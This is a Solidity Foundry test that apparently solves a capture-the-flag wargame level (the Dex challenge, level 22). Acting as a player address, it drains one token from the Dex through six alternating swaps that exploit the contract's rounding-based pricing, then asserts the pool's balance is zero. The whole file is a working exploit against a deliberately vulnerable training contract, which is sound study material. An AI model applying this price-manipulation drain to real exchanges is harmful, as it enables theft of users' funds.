// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Dex} from "../instances/Ilevel22.sol";

contract Attacker is Test {
    Dex level22 = Dex(0xAde3786475d685f56c63eAAC7335D0Bf8b6C9F75);
    address token1 = level22.token1();
    address token2 = level22.token2();

    address player = 0xE58EB5D607D62AdDf5F16e3750FB56adD6771917;

    function test() external {
        vm.startPrank(player);

        level22.approve(address(level22), type(uint256).max);

        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);

        vm.stopPrank();

        assertEq(level22.balanceOf(token1, address(level22)), 0);
    }
}
